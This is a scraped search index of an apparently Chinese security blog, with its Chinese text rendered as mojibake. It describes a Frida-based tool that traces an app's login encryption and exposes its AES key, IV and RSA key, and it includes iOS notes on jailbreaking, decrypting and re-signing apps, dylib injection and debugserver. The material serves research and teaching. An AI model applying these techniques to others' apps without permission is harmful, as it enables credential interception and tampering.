åŒºå—é“¾æŠ€æœ¯å®‰å…¨è®¨è®º ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:161","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2017-06-12 åŒºå—é“¾æŠ€æœ¯çš„å®‰å…¨ä»·å€¼ä¸å±€é™æ€§è§£æ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:162","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2016-10-12 æµ…æäº’è”ç½‘åæœ€å…·é¢ è¦†æ€§åˆ›æ–°æŠ€æœ¯â€”â€”åŒºå—é“¾å®‰å…¨ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:163","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2016-06-09 å¾®è½¯æ¬²æ‰“é€ åŸºäºâ€œåŒºå—é“¾â€æŠ€æœ¯çš„èº«ä»½è¯†åˆ«ç³»ç»Ÿ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:164","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["iOS"],"content":"FridaDev ä½œä¸ºå¤§è‡ªç„¶çš„æ¬è¿å·¥å’Œç»„è£…å¸ˆå‚…ï¼Œæ”¶é›†å¹¶å¢å¼ºä¸€äº›éå¸¸æœ‰ç”¨çš„fridaè„šæœ¬å°è£…ä¸ºFridaDevå·¥å…·ï¼Œå¯ä»¥å®ç°ä¸€é”®å¼é€†å‘éœ€æ±‚ï¼Œæé«˜ç”Ÿäº§åŠ›ã€‚ è„šæœ¬æ¥æºï¼š https://github.com/0xdea/frida-scripts https://github.com/AloneMonkey/iOSREBook/tree/master/chapter-7/7.3%20Frida%E5%AE%9E%E6%88%98%E5%BA%94%E7%94%A8/Frida ä¿®æ”¹ï¼š åŠ¨æ€hook uiå¢åŠ æ‰“å°controllerå’Œaction æ ¹æ®ç¨³å®šæ€§traceé€‰æ‹©spwanï¼Œå…¶ä»–åŠŸèƒ½é€‰æ‹©attach ä»“åº“ç›´é€šè½¦ï¼šhttps://github.com/houugen/FridaDev ","date":"2018-11-30","objectID":"/posts/ios-hook-fridadev.html:1:0","tags":["iOS","Frida"],"title":"iOS Hook FridaDev","uri":"/posts/ios-hook-fridadev.html"},{"categories":["iOS"],"content":"åŠŸèƒ½ usage: fridaDev.py [-h] [-l] [-i] [-u appName] [-d appName] [-t identifier] [-e identifier] frida tools optional arguments: -h, --help show this help message and exit -l, --list list running processes -i, --info list installed app infomation -u appName, --ui appName show UI (only for ios) -d appName, --dynhook appName dynamic hook -t identifier, --trace identifier ObjC/java and Module tracer -e identifier, --enumerate identifier Collection of functions to enumerate classes and list åŠŸèƒ½ï¼šåˆ—å‡ºè¿è¡Œè¿›ç¨‹ååŠpid ä½¿ç”¨ï¼ˆæ”¯æŒgrepï¼‰ï¼š ./fridaDev.py -l (| grep xxx)` [*] Device info: Device(id=\"83ae210b1d153c611e268b45b54e5f77d575212b\", name=\"iPhone\", type='usb') pid name 0 launchd 1 launchd 179 amfid 346 jailbreakd 491 wifid ... info åŠŸèƒ½ï¼šåˆ—å‡ºå·²è£…åº”ç”¨çš„åº”ç”¨åã€bundleIdåŠæ²™ç›’è·¯å¾„ ä½¿ç”¨ï¼ˆæ”¯æŒgrepï¼‰ï¼š ./fridaDev.py -i (| grep xxx) [*] Device info: Device(id=\"83ae210b1d153c611e268b45b54e5f77d575212b\", name=\"iPhone\", type='usb') app name bundle identify documents path undefinedQQæµè§ˆå™¨ com.tencent.mttlite file:///private/var/mobile/Containers/Data/Application/0F2137C5-52EC-4C44-9247-9D1E2666AE0C/Documents è®¡ç®—å™¨ com.apple.calculator file:///private/var/mobile/Containers/Data/Application/4A593BCE-1460-4785-BC18-18DFAF5BFFBA/Documents é€šè®¯å½• com.apple.MobileAddressBook file:///private/var/mobile/Containers/Data/Application/F8C2EB38-1FBE-415B-B562-C910589F66FE/Documents å’ªå’•å–„è·‘ org.imohoo.shanpao file:///private/var/mobile/Containers/Data/Application/0FC0A9BF-958C-4BCD-9AF0-5680B414A853/Documents uiï¼ˆä»…æ”¯æŒiOSï¼‰ åŠŸèƒ½ï¼šdump iOSç•Œé¢å¸ƒå±€ï¼Œæ”¯æŒæ‰“å°nextResponderã€controlleråŠaction ä½¿ç”¨ï¼š æ‰“å¼€éœ€è¦dumpçš„åº”ç”¨ç•Œé¢ ./fridaDev.py -u appName æ‰“å°å“åº”é“¾nextResponderï¼š n 0x144f6e6c0 æ‰“å°controllerï¼š c 0x144f6e6c0 æ‰“å°actionï¼š a 0x144f6e6c0 [*] Device info: Device(id=\"83ae210b1d153c611e268b45b54e5f77d575212b\", name=\"iPhone\", type='usb') \u003cUIWindow: 0x146007e40; frame = (0 0; 320 480); gestureRecognizers = \u003cNSArray: 0x146009290\u003e; layer = \u003cUIWindowLayer: 0x146007dc0\u003e\u003e | \u003cUILayoutContainerView: 0x144d629d0; frame = (0 0; 320 480); autoresize = W+H; gestureRecognizers = \u003cNSArray: 0x14602c450\u003e; layer = \u003cCALayer: 0x144d63ac0\u003e\u003e | | \u003cUINavigationTransitionView: 0x146026be0; frame = (0 0; 320 480); clipsToBounds = YES; autoresize = W+H; layer = \u003cCALayer: 0x146023cf0\u003e\u003e | | | \u003cUIViewControllerWrapperView: 0x144f6fd50; frame = (0 0; 320 480); autoresize = W+H; layer = \u003cCALayer: 0x144f6f2e0\u003e\u003e ... | | | | | | | \u003cFireflyButton: 0x144f6e6c0; baseClass = UIButton; frame = (38 120.5; 183 34); clipsToBounds = YES; opaque = NO; layer = \u003cCALayer: 0x144f6d690\u003e\u003e | | | | | | | | \u003cUIButtonLabel: 0x1460665c0; frame = (73.5 6.5; 36 21.5); text = 'ç™»å½•'; opaque = NO; userInteractionEnabled = NO; layer = \u003c_UILabelLayer: 0x1460667e0\u003e\u003e | | | | | | | | | \u003c_UILabelContentLayer: 0x144f67e20\u003e (layer) | | \u003cUINavigationBar: 0x144da8880; frame = (0 20; 320 44); opaque = NO; autoresize = W; tintColor = UIDeviceWhiteColorSpace 1 1; gestureRecognizers = \u003cNSArray: 0x14602ddd0\u003e; layer = \u003cCALayer: 0x1460279d0\u003e\u003e | | | \u003c_UINavigationBarBackground: 0x146026f60; frame = (0 -20; 320 64); opaque = NO; autoresize = W; userInteractionEnabled = NO; layer = \u003cCALayer: 0x14602b8b0\u003e\u003e | | | | \u003cUIImageView: 0x144db8f10; frame = (0 64; 320 0); opaque = NO; userInteractionEnabled = NO; layer = \u003cCALayer: 0x146023e00\u003e\u003e | | | \u003c_UINavigationBarBackIndicatorView: 0x14602cab0; frame = (8 11.5; 13 21); alpha = 0; opaque = NO; userInteractionEnabled = NO; layer = \u003cCALayer: 0x144da7510\u003e\u003e \u003cCSNavJViewController 0x1450fe000\u003e, state: appeared, view: \u003cUILayoutContainerView 0x144d629d0\u003e | \u003cFireflyTestLoginViewController 0x144f37c30\u003e, state: appeared, view: \u003cUIView 0x14602d3a0\u003e a 0x144f6e6c0 -\u003e loginButtonClick c 0x144f6e6c0 -\u003e \u003cFireflyTestLoginViewController: 0x144f37c30\u003e n 0x144f6e6c0 -\u003e\u003cUIImageView: 0x144f33530; frame = (30.5 145.5; 259 189); alpha = 0.8; opaque = NO; layer = \u003cCALayer: 0x144f03d00\u003e\u003e --\u003e\u003cUIImageView: 0x144f390a0; frame = (0 0; 320 480); opaque = NO; layer = \u003cCALayer: 0x144f24d10\u003e\u003e ---\u003e\u003cUIView: 0x14602d3a0; frame = (0 0; 320 480); autoresize = W+H; layer = \u003cCALayer: 0x144d49060\u003e\u003e ----\u003e\u003cFireflyTestLoginViewControl","date":"2018-11-30","objectID":"/posts/ios-hook-fridadev.html:1:1","tags":["iOS","Frida"],"title":"iOS Hook FridaDev","uri":"/posts/ios-hook-fridadev.html"},{"categories":["iOS"],"content":"å®ä¾‹ ä»¥æŸappä¸ºä¾‹ä»‹ç»å·¥å…·ä½¿ç”¨ã€‚ ç™»å½•ç•Œé¢ ç™»å½•æ•°æ®åŒ…åŠ å¯† ç°åœ¨éœ€è¦ç ´è§£åŠ è§£å¯†ï¼Œåˆ†ä¸¤ç§æ–¹å¼ï¼š çŒœè§£åŠ è§£å¯†å…³é”®å­—å®šä½åŠ è§£å¯†å‡½æ•° æ­£å‘åˆ†æç™»å½•åŠŸèƒ½æ‰¾åˆ°åŠ è§£å¯†é€»è¾‘ çŒœè§£ çŒœè§£çš„æ–¹å¼å­˜åœ¨å¶ç„¶æ€§ï¼Œä¸é‡‡ç”¨æ ‡å‡†åº“åŠ å¯†æˆ–å¸¸è§„åŠ è§£å¯†å‘½åçš„å°±å¾ˆéš¾æ‰¾åˆ°ã€‚ æˆ‘ä»¬å°è¯•ä½¿ç”¨fridaDevçš„--enumerateåŠŸèƒ½æšä¸¾åŠ è§£å¯†é€»è¾‘ï¼Œä¿®æ”¹ios_enum.jsä¸­çš„æ­£åˆ™åŒ¹é…æšä¸¾æ–¹æ³•å¤„ä»£ç ï¼Œæ­£åˆ™ä¸­ä¿®æ”¹ä¸ºencrypt|decrypt. var d = findMethods(/encrypt|decrypt/i); for (k in d) { console.log(k); d[k].forEach(function(s) { console.log(\"\\t\" + s); }); } è¿è¡Œè„šæœ¬æŸ¥çœ‹è¾“å‡º [*] Device info: Device(id=\"83ae210b1d153c611e268b45b54e5f77d575212b\", name=\"iPhone\", type='usb') CMBCStandardiOSSipKeyboardVC - setNeedEncrypt: - getEncryptedDataWithError: - needEncrypt - initWithKeyboardType:needEncrypt: FireflySecurityUtil + qhd_FireflyRSAEncrypt:cerPath: + qhd_FireflyRSAEncrypt:publicKey: + qhd_aesDecryptğŸ”‘vector: + qhd_aesEncryptğŸ”‘vector: + aesEncryptğŸ”‘vector: + aesDecryptğŸ”‘vector: + FireflyRSAEncrypt:publicKey: + FireflyRSAEncrypt:cerPath: CMCCSafeManager - getEncryptCode: - decryptCode: - getDecryptCode: - encryptCode: - encryptWithContent: - decryptWithContent: ... é€šè¿‡æŒ¨ä¸ªæ’æŸ¥æˆ–è€…ä½ dumpäº†ç•Œé¢UIçŸ¥é“viewçš„controllerç±»åï¼Œå…¶å®å·²ç»åŸºæœ¬èƒ½çŒœæµ‹è°ƒç”¨å“ªäº›ç›¸å…³åŠ è§£å¯†å‡½æ•°ã€‚ å¦‚æœä½ è¿˜æ˜¯ä¸ç¡®å®šå“ªä¸ªç±»é‡Œçš„é‚£ä¸ªæ–¹æ³•è¢«è°ƒç”¨ï¼Œæ²¡å…³ç³»ï¼Œæˆ‘ä»¬é€šè¿‡traceåŠŸèƒ½è¿½è¸ªå‡½æ•°è°ƒç”¨æ¥ç¡®å®šå…·ä½“ä½¿ç”¨å“ªä¸ªæ–¹æ³•ã€‚ ä¿®æ”¹ios_trace.jså°¾éƒ¨ä»£ç ï¼š if (ObjC.available) { trace(\"*[CMBCStandardiOSSipKeyboardVC *]\"); trace(\"*[FireflySecurityUtil *]\"); trace(\"*[CMCCSafeManager *]\"); } else { send(\"error: Objective-C Runtime is not available!\"); } è¿è¡Œä»£ç åå¯åŠ¨åº”ç”¨ï¼Œç‚¹å‡»ç™»å½•æŸ¥çœ‹æ­¤å¤„logï¼š ... *** entered +[FireflySecurityUtil FireflyRSAEncrypt:publicKey:] Caller: 0x1840de580 CoreFoundation!__invoking___ FireflyRSAEncrypt: {\"flag\":\"0\",\"ckey\":\"AZWKLXOMREDGAKPMTIBHTKOBRVGKNBHC\"} publicKey: MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDFV+0lKbisYcFxEaalfN4DMc14fMVTZTFZB1X4MoZtEu6lFpVvmSZT4eaSgp1Vxol8HSsqFncxxtv/GXpqJ3kY1DghafKliSFfTkV1PYoHKGoUYVdwt/HubzQBcC3xh+xiZvspBWy4Bjal//HoHrBBN05R2ZFnU9obS4Xw+jKbOQIDAQAB *** entered +[FireflySecurityUtil stripPublicKeyHeader:] Caller: 0x1840de580 CoreFoundation!__invoking___ stripPublicKeyHeader: \u003c30819f30 0d06092a 864886f7 0d010101 05000381 8d003081 89028181 00c557ed 2529b8ac 61c17111 a6a57cde 0331cd78 7cc55365 31590755 f832866d 12eea516 956f9926 53e1e692 829d55c6 897c1d2b 2a167731 c6dbff19 7a6a2779 18d43821 69f2a589 215f4e45 753d8a07 286a1461 5770b7f1 ee6f3401 702df187 ec6266fb 29056cb8 0636a5ff f1e81eb0 41374e51 d9916753 da1b4b85 f0fa329b 39020301 0001\u003e retval: \u003c30818902 818100c5 57ed2529 b8ac61c1 7111a6a5 7cde0331 cd787cc5 53653159 0755f832 866d12ee a516956f 992653e1 e692829d 55c6897c 1d2b2a16 7731c6db ff197a6a 277918d4 382169f2 a589215f 4e45753d 8a07286a 14615770 b7f1ee6f 3401702d f187ec62 66fb2905 6cb80636 a5fff1e8 1eb04137 4e51d991 6753da1b 4b85f0fa 329b3902 03010001\u003e *** exiting +[FireflySecurityUtil stripPublicKeyHeader:] retval: NrbG9/JxK65OMfl9WsFmCYU5Xfr1Av6Q/XOulxeoDc5CSf2AajFgE3CSH6MVHD3YlqCq4/Z20PevpakS1LMjsIpiywsOsrrfDESr87ATJ3Ta4TuGfg7ooLwAbUVHh77a4ZJInEaz63cpZuviy5b/fsftGjqllWtqxATNjU3dRBI= *** exiting +[FireflySecurityUtil FireflyRSAEncrypt:publicKey:] *** entered +[FireflySecurityUtil isJailBreak] Caller: 0x1840de580 CoreFoundation!__invoking___ retval: 0x1 *** exiting +[FireflySecurityUtil isJailBreak] ... *** entered -[FireflySecurityUtil aesToken] Caller: 0x1840de580 CoreFoundation!__invoking___ retval: AZWKLXOMREDGAKPM5pblzNXaVqAXmBwl *** exiting -[FireflySecurityUtil aesToken] *** entered +[FireflySecurityUtil aesEncryptğŸ”‘vector:] Caller: 0x1840de580 CoreFoundation!__invoking___ aesEncrypt: {\"secRan\":\"W9zvEM\",\"staffId\":\"F\",\"password\":\"NmQk8hKN9Sn1UTQha4JnAxYnfJiUGdwTw+Lws9rWHhsXgBt2ZARjOfrxH3Ka166Wias83OROXYjof6NvZ9zMJaKAP1NBPsiWZEE7gkRDlpCKwR\\/AVMwOzA4xAFcb7WKWIWrJg7NjpsvMvsjxzqxx\\/2sR4zglTx8P6jpHWigCEf0=\",\"imeiCode\":\"3823ACEE-A647-46F8-8D14-8065E5C2B0C6\",\"validateImgCode\":\"\"} key: AZWKLXOMREDGAKPM5pblzNXaVqAXmBwl vector: 1234567812345678 retval: yUF8H3QiqR21mTIrNxTTRtNx4l2IAyJ6AT0r7ATs9vO5MgYCahUT3qRxrT+qWDhyDD2znN5t1esauWYHPt+2AAd4NrfcYVs/QPMOstjpGcp4wey1HssAYNk2OtAKz5lRo6Bnw8CFiKMWdpdBS5Y4/G80irK0Dq12oPc52I956UtP3zCFNqE2rfQFZqcd35FA0CajccT5Ny6v/qKoScApnTLBmTKMmj3na+PTzyIOLXr1ObjwY9C+Snygf4xzb9AEU73WbIjxhsfdG6m3mEGrugw8Gn3nj/Eqb3mREUkvsQMt9FezDd4PWnJTRM6r6D5S5WI7ACYJU8kYDF0VK4H0Ixpe+xNoLdtYa","date":"2018-11-30","objectID":"/posts/ios-hook-fridadev.html:1:2","tags":["iOS","Frida"],"title":"iOS Hook FridaDev","uri":"/posts/ios-hook-fridadev.html"},{"categories":["iOS"],"content":"iOSç³»ç»Ÿå®‰å…¨æ¶æ„ å®‰å…¨å¯åŠ¨é“¾ ä¿¡ä»»é“¾ï¼šç³»ç»Ÿå¯åŠ¨ -\u003e boot rom -\u003e LLB -\u003e iBoot -\u003e kernal ç³»ç»Ÿè½¯ä»¶æˆæƒ å›ºä»¶ -\u003e cpu -\u003e itunes ==\u003e æœåŠ¡å™¨éªŒè¯ ä½ç‰ˆæœ¬æœåŠ¡å™¨è¿”å›éªŒè¯è®¸å¯ï¼Œå¯é€šè¿‡ä¿å­˜shshç»•è¿‡éªŒè¯ é«˜ç‰ˆæœ¬è¿”å›éªŒè¯è®¸å¯+éšæœºä¸² åº”ç”¨ä»£ç ç­¾å æ‰€æœ‰å¯æ‰§è¡Œä»£ç ï¼ˆåŠ¨æ€åº“ï¼ŒåŠ¨æ€èµ„æºï¼‰è¿è¡Œæ—¶éªŒè¯ç­¾å è¿è¡Œæ—¶è¿›ç¨‹å®‰å…¨ æ²™ç›’ï¼š/var/mobile/Containers/Data/Application/[GUID] DEP ASLR æ•°æ®åŠ å¯†ä¿æŠ¤ ç¡¬ä»¶ç§˜é’¥ + å¯†ç ç§˜é’¥ -\u003e ç±»ç§˜é’¥ ç¡¬ä»¶ç§˜é’¥ -\u003e æ–‡ä»¶ç³»ç»Ÿç§˜é’¥ ç±»ç§˜é’¥ + æ–‡ä»¶ç³»ç»Ÿç§˜é’¥ -\u003e æ–‡ä»¶ç§˜é’¥ =\u003e æ–‡ä»¶å†…å®¹ ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:1:0","tags":["iOS"],"title":"iOSé€†å‘ç¬”è®°","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"è¶Šç‹± Cydia Substrate MobileHooker MobileLoader safe mode sshè¿æ¥iosè®¾å¤‡ openssh ssh root@ip é€šè¿‡usbè¿æ¥ï¼š usbmuxd -\u003e tcpreplay.py -t 22:xx brew install libimobiledevice -\u003e iproxy 2222 22 ssh root@localhost -p xx é…ç½®å…å¯†ç ç™»å½•è¶Šç‹±è®¾å¤‡ ssh-keygen -t rsa -P '' ssh-copy-id -i /Users/username/.ssh/id_rsa root@ip æˆ–è€…å®‰è£…sshpassè‡ªå·±è®¾ç½®å¯†ç : brew install https://raw.githubusercontent.com/kadwanev/bigboybrew/master/Library/Formula/sshpass.rb Tip ssh keyä¸åŒ¹é…ï¼Œåˆ é™¤.ssh/know_hostså¯¹åº”å¯ä»¥å³å¯ ç»ˆç«¯è¾“å…¥ä¸­æ–‡ cd /var/root touch .inputrc echo 'set convert-meta off' \u003e\u003e .inputrc echo 'set meta-flag on' \u003e\u003e .inputrc echo 'set output-meta on' \u003e\u003e .inputrc echo 'set input-meta on' \u003e\u003e .inputrc æ’ä»¶ psï¼šå®‰è£…adv-cmds ç»•è¿‡appç­¾åï¼šå®‰è£…appsync æ–‡ä»¶æ˜¾ç¤ºï¼šå®‰è£…apple file conduit 2 fileza è¶Šç‹±å·¥å…· next.tweakboxapp.com ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:2:0","tags":["iOS"],"title":"iOSé€†å‘ç¬”è®°","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"appæ–‡ä»¶ç»“æ„å’Œæ„å»º æŸ¥çœ‹ç¬¦å·è¡¨ï¼šnm -nm ä¾èµ–åº“ã€æ±‡ç¼–ç­‰ï¼šotool -L / -tV ä»æºä»£ç åˆ°ipaçš„æ„å»ºè¿‡ç¨‹ ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:3:0","tags":["iOS"],"title":"iOSé€†å‘ç¬”è®°","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"æ•°æ®å­˜å‚¨ property list plutil -convert xml1 xx -o xx.plist User Defaults sandbox -\u003e Library -\u003e Preferences -\u003e xx.plist Archive Database sqlite keyChain Keychain Dumper ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:4:0","tags":["iOS"],"title":"iOSé€†å‘ç¬”è®°","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"Runtime ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:5:0","tags":["iOS"],"title":"iOSé€†å‘ç¬”è®°","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"Hook Method Swizzle é’ˆå¯¹objective-Cï¼Œåˆ©ç”¨runtimeï¼Œæ›¿æ¢Dispatch tableä¸­SELå’ŒIMPçš„å¯¹åº”å…³ç³»ã€‚ IOSé»‘é­”æ³•ï¼Method Swizzling Objective-C Method Swizzling çš„æœ€ä½³å®è·µ å¦‚ä½•åœ¨ Swift ä¸­é«˜æ•ˆåœ°ä½¿ç”¨ Method Swizzling fishhook rebind_symbolsï¼šéå†æŸ¥æ‰¾æ‡’åŠ è½½è¡¨å’Œéæ‡’åŠ è½½è¡¨çš„ç¬¦å·å¹¶æ›¿æ¢åœ°å€ã€‚ https://github.com/facebook/fishhook Cydia Substrate MSHookMessageEx -\u003e objC replace Objective-C message implementations MSHookFunction -\u003e c hijack native code to your own implementation http://iphonedevwiki.net/index.php/Cydia_Substrate ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:6:0","tags":["iOS"],"title":"iOSé€†å‘ç¬”è®°","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"ARMæ±‡ç¼– push {r0} \u003c==\u003e str r0,[sp,#-4]! pop {r0} \u003c==\u003e ldr r0,[sp],#4 æ±‡ç¼–ä½¿ç”¨intelæ¨¡å¼ï¼šhttps://github.com/vadimcn/vscode-lldb/issues/87 æ¨¡æ‹Ÿå™¨ä½¿ç”¨x86æ¶æ„ï¼Œ32ä½å…¥æ ˆã€‚64ä½rdiã€rsiã€rdxã€rcxã€r8ã€r9ï¼Œå¤šä½™å‚æ•°å…¥æ ˆã€‚ çœŸæœºarmæ¶æ„ï¼Œ32ä½r0-3ï¼Œ64ä½w0-8ã€‚ ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:7:0","tags":["iOS"],"title":"iOSé€†å‘ç¬”è®°","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"Mach-O æ–‡ä»¶æ¶æ„ lipo -info whatsApp file whatsApp Header otool -hv whatsApp MachOView é­”æ•° é€šç”¨æ ¼å¼ï¼š0xcafebabe armv7ï¼š0xfeedface arm64ï¼š0xfeedfacf æ–‡ä»¶ç±»å‹ OBJECTï¼š1 EXECUTEï¼š2 DYLIBï¼š6 Load commands -\u003e n * Segment otool -lv whatsApp (lldb) image list -e -f Load commands -\u003e LC_SEGMENT(_TEXT) -\u003e VM address åŠ è½½åœ°å€ + æ®µè™šæ‹Ÿåœ°å€ = æ–‡ä»¶åŠ è½½åœ°å€ Data -\u003e n * Section Mach-OåŠ¨æ€é“¾æ¥ï¼ˆå»¶è¿ŸåŠ è½½ï¼‰ Code Signature codesign -dvvvv whatsApp ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:8:0","tags":["iOS"],"title":"iOSé€†å‘ç¬”è®°","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"Appç­¾å æŸ¥çœ‹åŠ å¯†æ ‡è¯†ï¼š otool -l whatsApp | grep crypt æŸ¥çœ‹ç”µè„‘ä¸­è¯ä¹¦ security find-identity -v -p codesigning è·å–æè¿°æ–‡ä»¶ï¼ˆembedded.mobileprovisionï¼‰ è‹¹æœå®˜ç½‘è·å– æ–°å»ºå·¥ç¨‹çœŸæœºå®‰è£…ååœ¨åŒ…ä¸­è·å– æŸ¥çœ‹ï¼šsecurity cms -D -i embedded.mobileprovision æ‹·è´è‡³è¦ç­¾åæ–‡ä»¶ä¸­ ç”Ÿæˆæˆæƒæ–‡ä»¶ security cms -D -i embedded.mobileprovision \u003e entitlements_full.plist /usr/libexec/PlistBuddy -x -c â€˜Print:Entitlementsâ€™ entitlements_full.plist \u003e entitlements.plist é‡ç­¾å codesign -fs â€œiPhone Developer: xxxï¼ˆ2ä¸­è¯ä¹¦åï¼‰â€ â€“no-strict â€“entitlements=xxxï¼ˆ4ä¸­æˆæƒæ–‡ä»¶ï¼‰ Payload/xxx.app å¦‚æœæœ‰extensionï¼Œå¯åˆ å¯é‡ç­¾å å¦‚æœæ–°åŠ åŠ¨æ€åº“ï¼Œéœ€è¦ç­¾å å‹ç¼©ä¸ºipa zip -qr target.ipa Payload ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:9:0","tags":["iOS"],"title":"iOSé€†å‘ç¬”è®°","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"åŠ¨æ€åº“ clangç¼–è¯‘objecå¹¶ç­¾åï¼Œæ”¾å…¥Library-\u003eload dylibrary-\u003eDynamicLibariesä¸­ å¯¼å‡ºå’Œéšè—ç¬¦å· static export_list -fvisibility=hidden å‡½æ•°è°ƒç”¨é¡ºåº __attribute__((constructor)) main __attribute__((destructor)) åŸºäºc++åŠ¨æ€åº“ åŸºäºocåŠ¨æ€åº“ æ³¨å…¥å¯æ‰§è¡Œæ–‡ä»¶ LC_LOAD_DYLIB å·¥å…·: insert_dylib æŸ¥çœ‹ï¼šotool -L ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:10:0","tags":["iOS"],"title":"iOSé€†å‘ç¬”è®°","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"åº”ç”¨ç ¸å£³ æŸ¥çœ‹åŠ å£³ otool -l xx(mach-o) | grep cryptid ä»itoolså¯¼å‡ºipa åˆ©ç”¨scpå¯¼å‡ºæ‰§è¡Œæ–‡ä»¶ï¼ˆæ‰“å¼€appï¼Œpsæ‰¾åˆ°è¿›ç¨‹ï¼‰ ç ¸å£³å·¥å…· dumpdecrypted æŸ¥æ‰¾Documentè·¯å¾„: cycript -p WeChat NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES)[0] AloneMonkey/dumpdecrypted Clutch frida-ios-dump ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:11:0","tags":["iOS"],"title":"iOSé€†å‘ç¬”è®°","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"class-dump https://github.com/nygard/class-dump å®˜æ–¹å·¥å…·ä¿®æ­£åç¼–è¯‘ï¼š // CDObjectiveC2Processor.m 224h objc2Class.data = value \u0026 ~3; //error: value \u0026 ~7; ./class-dump mach-o_file -H -o ./Headers Tip é€šè¿‡ lipo mach-o_file -thin armv7 -output mach-o_file.armv7 ç˜¦èº«æå–ç ¸å£³æ¶æ„ ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:12:0","tags":["iOS"],"title":"iOSé€†å‘ç¬”è®°","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"Reveal cydiaä¸­æ·»åŠ BigBossæºå®‰è£…Reveal2Loaderï¼Œå¼€å¯revealä½¿ç”¨ é«˜ç‰ˆæœ¬revealéœ€è¦å°†RevealServerï¼ˆhelp-\u003eshow reveal library in finder-\u003eios libraryï¼‰é‡å‘½åä¸ºlibReveal.dylibï¼Œå¹¶å’ŒlibReveal.plistä¸€åŒæ”¾å…¥iosçš„Library-\u003eMobileSubstrate-\u003eDynamicLibrariesä¸­ plistæ–‡ä»¶å†…å®¹ï¼š { Filter = { Bundles = ( \"bundleID\" ); }; } MonkeyDev ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:13:0","tags":["iOS"],"title":"iOSé€†å‘ç¬”è®°","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"cycript cycript ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:14:0","tags":["iOS"],"title":"iOSé€†å‘ç¬”è®°","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"é™æ€åˆ†æ å·¥å…· hopper IDA armæ±‡ç¼–ï¼Œç»“æ„ä½“ï¼ ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:15:0","tags":["iOS"],"title":"iOSé€†å‘ç¬”è®°","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"åŠ¨æ€è°ƒè¯• å¤„ç†debugserver ä¸‹è½½/Developer/usr/bin/debugserver æˆæƒæ–‡ä»¶entitlements.plistå†…å®¹ï¼š com.apple.springboard.debugapplications run-unsigned-code get-task-allow task_for_pid-allow ç­¾å ä¸Šä¼ è‡³/usr/bin/debugserver lldb + debugserver è¿æ¥ æ˜ å°„ç«¯å£ï¼š python tcpreply.py -t 22:2222 1234:1234 æ‰‹æœºï¼šdebugserver *:1234 -a WhatsApp pcï¼š llvm â€“\u003e process connect connect://localhost:1234 